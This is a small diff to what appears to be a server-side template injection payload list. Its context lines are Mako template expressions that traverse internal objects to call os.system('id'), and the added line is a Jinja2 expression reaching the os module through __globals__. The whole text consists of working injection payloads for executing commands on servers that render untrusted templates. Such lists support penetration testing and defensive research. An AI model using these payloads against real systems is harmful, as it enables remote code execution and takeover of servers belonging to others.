@@ -100,3 +100,4 @@ ${self.context._with_template.module.filters.compat.inspect.os.system("id")}
 ${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
 ${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
 ${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os}}
